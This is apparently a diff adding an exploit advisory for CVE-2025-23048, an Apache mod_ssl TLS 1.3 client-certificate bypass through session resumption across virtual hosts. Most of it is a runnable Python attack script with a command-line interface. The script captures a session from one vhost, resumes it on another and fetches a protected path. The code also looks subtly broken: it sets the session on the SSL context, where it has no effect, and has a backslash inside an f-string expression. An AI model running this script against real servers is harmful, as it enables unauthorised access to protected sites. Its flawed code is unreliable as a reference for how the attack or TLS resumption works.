@@ -1,0 +1,289 @@
+=============================================================================================================================================
+| # Title     : Apache mod_ssl TLS 1.3 Client Certificate Authentication Bypass                                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://httpd.apache.org/docs/current/mod/mod_ssl.html                                                                      |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/210763/ & CVE-2025-23048
+
+[+] Summary    : A flaw in Apache mod_ssl TLS 1.3 session resumption allows a client-authenticated TLS session to be resumed across different virtual hosts without re-validating
+                 the client certificate or trusted CA configuration.
+
+[+] Impact:
+
+An attacker with a valid client certificate for one virtual host can gain
+unauthorized access to another virtual host protected by a different CA.
+
+[+] Attack Vector:
+
+- TLS 1.3 Session Resumption
+- Client Certificate Authentication
+- Multiple Virtual Hosts
+
+[+] Tested Environment:
+
+- Apache HTTPD with mod_ssl
+- TLS 1.3 enabled
+- Client Certificate Authentication enabled
+- Multiple vhosts with different CA trust stores
+
+[+] POC :
+
+#!/usr/bin/env python3
+
+import ssl
+import socket
+import sys
+import argparse
+from typing import Optional, Tuple
+import time
+
+class CVE2025_23048_Exploit:
+    def __init__(self, host: str, port: int = 443):
+        self.host = host
+        self.port = port
+        self.session_data = None
+        
+    def create_ssl_context(self, 
+                          certfile: Optional[str] = None,
+                          keyfile: Optional[str] = None,
+                          cafile: Optional[str] = None,
+                          server_hostname: Optional[str] = None) -> ssl.SSLContext:
+        """Create SSL context with specified parameters"""
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        context.minimum_version = ssl.TLSVersion.TLSv1_3
+        context.maximum_version = ssl.TLSVersion.TLSv1_3
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        
+        if cafile:
+            context.load_verify_locations(cafile)
+            context.verify_mode = ssl.CERT_REQUIRED
+        
+        if certfile and keyfile:
+            context.load_cert_chain(certfile, keyfile)
+            
+        if server_hostname:
+            context.server_hostname = server_hostname
+            
+        return context
+    
+    def perform_full_handshake(self, 
+                              vhost: str,
+                              certfile: str,
+                              keyfile: str,
+                              cafile: str) -> Tuple[bool, bytes]:
+        """
+        Perform full TLS 1.3 handshake with client certificate
+        Returns: (success, session_data)
+        """
+        print(f"[+] Performing full TLS 1.3 handshake with {vhost}")
+        
+        context = self.create_ssl_context(
+            certfile=certfile,
+            keyfile=keyfile,
+            cafile=cafile,
+            server_hostname=vhost
+        )
+        
+        try:
+            # Create socket and wrap with SSL
+            sock = socket.create_connection((self.host, self.port))
+            ssl_sock = context.wrap_socket(sock, server_hostname=vhost)
+            
+            # Get session data for resumption
+            self.session_data = ssl_sock.session
+            
+            # Test access
+            request = f"GET / HTTP/1.1\r\nHost: {vhost}\r\n\r\n"
+            ssl_sock.send(request.encode())
+            response = ssl_sock.recv(4096)
+            
+            print(f"[*] Connected to {vhost}")
+            print(f"[*] HTTP Status: {response.decode().split('\\r\\n')[0]}")
+            print(f"[*] Session ticket captured: {self.session_data is not None}")
+            
+            ssl_sock.close()
+            return True, self.session_data
+            
+        except Exception as e:
+            print(f"[-] Error during full handshake: {e}")
+            return False, None
+    
+    def resume_session(self, 
+                      vhost: str,
+                      session_data: bytes,
+                      cafile: Optional[str] = None,
+                      protected_path: str = "/") -> bool:
+        """
+        Resume TLS session to different vhost
+        Returns: True if bypass successful
+        """
+        print(f"\n[+] Attempting session resumption to {vhost}")
+        
+        context = self.create_ssl_context(
+            cafile=cafile,
+            server_hostname=vhost
+        )
+        
+        try:
+            # Set the session for resumption
+            context.session = session_data
+            
+            # Connect with session resumption
+            sock = socket.create_connection((self.host, self.port))
+            ssl_sock = context.wrap_socket(sock, server_hostname=vhost)
+            
+            # Check if session was resumed
+            if ssl_sock.session_reused:
+                print(f"[!] SUCCESS: Session resumed to {vhost}")
+                
+                # Try to access protected resource
+                request = f"GET {protected_path} HTTP/1.1\r\nHost: {vhost}\r\n\r\n"
+                ssl_sock.send(request.encode())
+                response = ssl_sock.recv(8192)
+                
+                response_str = response.decode('utf-8', errors='ignore')
+                status_line = response_str.split('\r\n')[0]
+                
+                print(f"[*] HTTP Response: {status_line}")
+                
+                # Check if access was granted
+                if "200 OK" in status_line:
+                    print(f"[!] CRITICAL: Unauthorized access successful!")
+                    print(f"[!] Accessed {protected_path} on {vhost} without valid certificate")
+                    
+                    # Extract some response content
+                    if "Vhost2 Secret" in response_str or "Restricted" in response_str:
+                        print(f"[!] Confirmed access to protected content!")
+                        # Print snippet of response
+                        lines = response_str.split('\r\n')
+                        for line in lines[-10:]:  # Last 10 lines
+                            if line.strip():
+                                print(f"    Content: {line[:100]}...")
+                    
+                    return True
+                else:
+                    print(f"[-] Access denied: {status_line}")
+                    return False
+            else:
+                print("[-] Session was not resumed (full handshake occurred)")
+                return False
+                
+        except Exception as e:
+            print(f"[-] Error during session resumption: {e}")
+            return False
+    
+    def exploit(self, 
+               vhost1: str,
+               cert1: str,
+               key1: str,
+               ca1: str,
+               vhost2: str,
+               ca2: str,
+               protected_path: str = "/restricted/"):
+        """
+        Complete exploitation chain
+        """
+        print(f"""
+        ╔════════════════════════════════════════════════════════════════════════════════╗
+        ║  Apache mod_ssl TLS 1.3 Client Certificate Authentication Bypass By indoushka  ║
+        ╚════════════════════════════════════════════════════════════════════════════════╝
+        
+        Target: {self.host}:{self.port}
+        Vhost1: {vhost1} (Legitimate access with CA1)
+        Vhost2: {vhost2} (Should require CA2)
+        Protected Path: {protected_path}
+        """)
+        
+        # Step 1: Authenticate to vhost1
+        print("\n" + "="*60)
+        print("STEP 1: Legitimate authentication to first vhost")
+        print("="*60)
+        
+        success, session = self.perform_full_handshake(vhost1, cert1, key1, ca1)
+        
+        if not success or not session:
+            print("[-] Failed to establish initial session")
+            return False
+        
+        # Small delay
+        time.sleep(1)
+        
+        # Step 2: Resume session to vhost2
+        print("\n" + "="*60)
+        print("STEP 2: Session resumption attack on second vhost")
+        print("="*60)
+        
+        # Try with CA2 (should fail in proper validation)
+        # But with the vulnerability, session will be resumed without validation
+        bypass_success = self.resume_session(
+            vhost2, 
+            session, 
+            ca2,  # This CA won't be properly checked during resumption
+            protected_path
+        )
+        
+        # Try also without any CA file (shouldn't work but demonstrates the bug)
+        print("\n" + "="*60)
+        print("STEP 3: Testing without any CA validation")
+        print("="*60)
+        
+        bypass_without_ca = self.resume_session(
+            vhost2,
+            session,
+            None,  # No CA file at all
+            protected_path
+        )
+        
+        if bypass_success or bypass_without_ca:
+            print("\n[!] EXPLOIT SUCCESSFUL!")
+            print("[!] Client certificate authentication was bypassed")
+            return True
+        else:
+            print("\n[-] Exploit failed")
+            return False
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Apache mod_ssl TLS 1.3 Client Certificate Authentication Bypass By indoushka"
+    )
+    parser.add_argument("--host", required=True, help="Target Apache server IP")
+    parser.add_argument("--port", type=int, default=443, help="HTTPS port (default: 443)")
+    parser.add_argument("--vhost1", required=True, help="First virtual hostname")
+    parser.add_argument("--cert1", required=True, help="Client certificate for vhost1")
+    parser.add_argument("--key1", required=True, help="Client private key for vhost1")
+    parser.add_argument("--ca1", required=True, help="CA certificate for vhost1")
+    parser.add_argument("--vhost2", required=True, help="Second virtual hostname to attack")
+    parser.add_argument("--ca2", required=True, help="CA certificate that vhost2 should trust")
+    parser.add_argument("--path", default="/restricted/", help="Protected path on vhost2")
+    
+    args = parser.parse_args()
+    
+    # Check if required files exist
+    import os
+    for file in [args.cert1, args.key1, args.ca1, args.ca2]:
+        if not os.path.exists(file):
+            print(f"[-] File not found: {file}")
+            return
+    
+    exploit = CVE2025_23048_Exploit(args.host, args.port)
+    exploit.exploit(
+        vhost1=args.vhost1,
+        cert1=args.cert1,
+        key1=args.key1,
+        ca1=args.ca1,
+        vhost2=args.vhost2,
+        ca2=args.ca2,
+        protected_path=args.path
+    )
+
+
+if __name__ == "__main__":
+    main()
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
